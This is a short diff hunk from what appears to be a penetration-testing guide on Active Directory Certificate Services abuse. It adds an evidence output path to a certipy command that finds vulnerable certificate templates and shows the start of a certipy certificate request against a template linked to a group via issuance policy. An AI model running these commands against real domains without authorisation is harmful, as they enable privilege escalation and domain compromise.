@@ -466,7 +466,7 @@ issuance policy resolution.
 
 ```bash
 # Enumerate vulnerable templates (certipy shows OID links)
-certipy find -k -no-pass -dc-ip DC_IP -vulnerable
+certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs
 
 # Request certificate from template with OID group link
 certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
